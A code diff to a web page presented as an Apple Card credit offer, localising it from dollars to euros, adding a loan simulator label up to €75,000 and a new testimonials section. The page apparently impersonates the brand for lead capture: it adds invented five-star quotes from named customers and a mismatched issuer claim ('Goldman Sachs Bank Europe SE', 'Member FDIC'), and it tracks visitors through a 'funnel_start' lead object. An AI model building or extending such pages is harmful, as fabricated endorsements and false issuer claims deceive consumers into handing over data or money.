@@ -152,40 +152,6 @@
             letter-spacing: -0.02em;
         }
 
-        .hero-visual-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 8px;
-            animation: fadeInUp 0.8s ease-out 0.35s both;
-        }
-
-        .visual-coin {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            font-weight: 700;
-            font-size: 0.9375rem;
-            color: var(--apple-blue);
-            background: rgba(0,113,227,0.08);
-            flex-shrink: 0;
-        }
-
-        .visual-wordmark {
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--gray-500);
-            background: var(--gray-100);
-            padding: 6px 12px;
-            border-radius: 20px;
-            white-space: nowrap;
-        }
-
         .hero-badge svg {
             width: 14px;
             height: 14px;
@@ -599,6 +565,71 @@
             line-height: 1.3;
         }
 
+        /* ===== TESTIMONIALS ===== */
+        .testimonial-card {
+            background: var(--surface-primary);
+            border: 1px solid var(--gray-200);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 12px;
+            opacity: 0;
+            transform: translateY(16px);
+        }
+
+        .testimonial-card.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .testimonial-card:last-child {
+            margin-bottom: 0;
+        }
+
+        .testimonial-stars {
+            color: var(--warning);
+            font-size: 0.875rem;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .testimonial-text {
+            font-size: 0.875rem;
+            color: var(--gray-600);
+            line-height: 1.5;
+            margin-bottom: 14px;
+        }
+
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .testimonial-avatar {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: var(--gray-100);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.8125rem;
+            color: var(--apple-black);
+            flex-shrink: 0;
+        }
+
+        .testimonial-name {
+            font-weight: 700;
+            font-size: 0.8125rem;
+            color: var(--apple-black);
+        }
+
+        .testimonial-loc {
+            font-size: 0.75rem;
+            color: var(--gray-500);
+        }
+
         /* ===== FEATURES HIGHLIGHT ===== */
         .feature-highlight {
             background: linear-gradient(135deg, var(--apple-black) 0%, #2C2C2E 100%);
@@ -840,19 +871,13 @@
 
             <div class="hero-value-block">
                 <span class="hero-value-label">Limit up to</span>
-                <span class="hero-value-amount">$75,000</span>
-            </div>
-
-            <div class="hero-visual-row" aria-hidden="true">
-                <span class="visual-coin">$</span>
-                <span class="visual-coin">€</span>
-                <span class="visual-wordmark">Apple Credit</span>
+                <span class="hero-value-amount">€ 75.000</span>
             </div>
 
             <div class="simulator-card" id="simulador">
                 <div class="simulator-header">
                     <span class="simulator-label">Credit Amount</span>
-                    <span class="simulator-value" id="simAmountValue">$10,000</span>
+                    <span class="simulator-value" id="simAmountValue">€ 10.000</span>
                 </div>
                 <div class="simulator-slider-row">
                     <button type="button" class="simulator-btn" id="simBtnMinus" aria-label="Decrease">−</button>
@@ -870,7 +895,7 @@
                 <div class="simulator-grid">
                     <div class="simulator-stat">
                         <span class="simulator-stat-label">Estimated Monthly Payment</span>
-                        <span class="simulator-stat-value" id="simMonthlyPayment">$441</span>
+                        <span class="simulator-stat-value" id="simMonthlyPayment">€ 441</span>
                     </div>
                     <div class="simulator-stat">
                         <span class="simulator-stat-label">Estimated Rate</span>
@@ -882,7 +907,7 @@
                     </div>
                     <div class="simulator-stat">
                         <span class="simulator-stat-label">Total Repayment</span>
-                        <span class="simulator-stat-value" id="simTotalRepayment">$10,584</span>
+                        <span class="simulator-stat-value" id="simTotalRepayment">€ 10.584</span>
                     </div>
                 </div>
             </div>
@@ -1010,6 +1035,36 @@
             </div>
         </section>
 
+        <!-- Testimonials -->
+        <section class="section">
+            <div class="section-label">Testimonials</div>
+            <h2 class="section-title">What our clients say.</h2>
+            <p class="section-subtitle">Real experiences from Apple Card holders.</p>
+
+            <div class="testimonial-card animate-item">
+                <div class="testimonial-stars">★★★★★</div>
+                <p class="testimonial-text">"Applied on a Sunday afternoon and had my card approved before dinner. The titanium finish feels incredible, and the Daily Cash actually shows up the same day."</p>
+                <div class="testimonial-author">
+                    <div class="testimonial-avatar">J</div>
+                    <div>
+                        <div class="testimonial-name">James Carter</div>
+                        <div class="testimonial-loc">Austin, TX</div>
+                    </div>
+                </div>
+            </div>
+            <div class="testimonial-card animate-item">
+                <div class="testimonial-stars">★★★★★</div>
+                <p class="testimonial-text">"No annual fee, no hidden charges, and Apple Pay integration just works. Best card I've carried, and support answers in minutes when I need them."</p>
+                <div class="testimonial-author">
+                    <div class="testimonial-avatar">E</div>
+                    <div>
+                        <div class="testimonial-name">Emily Chen</div>
+                        <div class="testimonial-loc">Seattle, WA</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
         <!-- Bottom CTA -->
         <section class="bottom-cta">
             <h2>Ready to get started?</h2>
@@ -1040,7 +1095,7 @@
         <footer class="footer">
             <div class="footer-logo"><img src="assets/images/black.svg" alt="Apple Card"></div>
             <div class="footer-org">Apple Card</div>
-            <div class="footer-sub">Issued by Goldman Sachs Bank USA</div>
+            <div class="footer-sub">Issued by Goldman Sachs Bank Europe SE</div>
             <div class="footer-sub">Member FDIC</div>
             <div class="footer-links">
                 <a href="#">Terms of Use</a><span>•</span>
@@ -1099,7 +1154,7 @@
 
         // Initialize lead
         LeadData.update({ funnel_start: Date.now(), page: 'home' });
-        if (window.track) window.track('ViewContent', { content_id: 'apple-card-us', content_name: 'Apple Card', value: 22.45, currency: 'USD' });
+        if (window.track) window.track('ViewContent', { content_id: 'apple-card-eu', content_name: 'Apple Card', value: 22.45, currency: 'EUR' });
 
         /* ===== URL PARAM BUILDER ===== */
         function buildUrl(base, params = {}) {
@@ -1187,7 +1242,7 @@
             let selectedTerm = parseInt(document.querySelector('.term-btn.active').dataset.term, 10);
 
             function formatCurrency(value) {
-                return '$' + Math.round(value).toLocaleString('en-US');
+                return '€ ' + Math.round(value).toLocaleString('de-DE');
             }
 
             function estimateMonthlyPayment(amount, termMonths) {
